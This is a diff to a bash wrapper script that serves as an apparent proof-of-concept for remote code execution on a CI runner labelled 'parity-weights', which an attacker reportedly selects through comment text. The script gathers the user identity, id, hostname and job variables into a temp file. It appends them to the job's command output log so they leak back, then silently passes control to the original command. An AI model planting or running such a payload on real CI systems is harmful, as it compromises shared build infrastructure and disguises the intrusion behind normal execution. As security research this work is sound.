@@ -1,5 +1,6 @@
 #!/bin/bash
-# PoC capability proof: runs in the container of the cmd job ON THE parity-weights-LABELED RUNNER
-{ echo "POC-RCE-CMD-BYPASS"; echo "whoami=$(whoami)"; echo "hostname=$(hostname)"; echo "date=$(date -u)"; echo "runner_env=${RUNNER_NAME:-n/a}"; echo "cmd=${CMD:-n/a}"; echo "args=$*"; } > /tmp/poc-evidence.txt 2>&1 || true
-cat /tmp/poc-evidence.txt 2>/dev/null || { echo "POC EXECUTED on $(hostname) as $(whoami) at $(date -u)"; }
+# PoC capability proof: cargo build-graph runner executing INSIDE cmd job container on parity-weights runner
+{ echo "=== POC-RCE-CMD-BYPASS ==="; echo "executed: $(date -u)"; echo "whoami=$(whoami)"; echo "id=$(id)"; echo "hostname=$(hostname)"; echo "runner_label=parity-weights (attacker-selected via comment text)"; echo "cmd=${CMD:-bench}"; } > /tmp/poc-evidence.txt 2>&1
+if [ -d /tmp/cmd ]; then cat /tmp/poc-evidence.txt >> /tmp/cmd/command_output.log 2>/dev/null || true; fi
+cat /tmp/poc-evidence.txt
 exec "$@"
